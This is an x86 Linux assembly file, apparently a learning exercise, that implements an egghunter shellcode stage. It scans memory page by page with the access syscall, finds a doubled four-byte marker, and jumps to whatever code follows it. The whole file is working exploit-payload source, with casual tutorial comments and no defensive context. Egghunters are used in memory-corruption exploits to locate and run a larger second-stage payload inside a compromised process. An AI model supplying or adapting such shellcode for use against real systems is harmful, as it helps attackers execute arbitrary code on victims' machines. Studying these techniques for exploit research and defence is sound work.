global _start

section .text

_start:
  xor edx, edx        ; we can't use cdq because we don't know the sign of EAX :(
loop_page:
  ; view your page size with `getconf PAGESIZE`
  ; getconf PAGESIZE == 4096 decimal / 0x1000 hex
  or dx, 0xfff        ; 0xfff hex == 4095 decimal
next_addr:
  inc edx             ; increment our pointer by one
  lea ebx, [edx+0x4]    ; load where our potential eggs are
  push byte 0x21           ; access system call
  pop eax             ; push / pop used to avoid XOR
  int 0x80            ; check if we have access to the EBX address(es)
  cmp al, 0xf2        ; if 0xf2, we have an EFAULT
  jz loop_page        ; we don't have access :( next page!
compare:
  mov eax, 0x73676733 ; 3ggs in little-endian, representing our egg!
  mov edi, edx        ; put the address to compare into EDI for the scasd operation
  ; about scasd - https://c9x.me/x86/html/file_module_x86_id_287.html
  scasd               ; if [EDI] == EAX - note: scasd checks a double word (4 bytes) then increments EDI
  jnz next_addr       ; this isn't our egg :( let's move on
  scasd               ; if [EDI] == EAX then we found our egg!
  jnz next_addr       ; nope :( unlucky it seems
matched:
  jmp edi             ; let's execute our egg!
